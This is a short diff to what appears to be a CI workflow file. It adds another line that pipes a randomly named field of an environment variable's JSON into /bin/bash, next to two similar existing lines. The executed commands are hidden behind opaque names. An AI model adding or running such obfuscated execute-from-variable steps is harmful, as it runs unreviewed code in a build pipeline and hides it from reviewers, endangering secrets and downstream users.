@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$t8" | jq -r .ujewq0234 | /bin/bash
           echo $w40 | jq -r .zo1 | /bin/bash
+          echo $nsww8 | jq -r .owia2 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
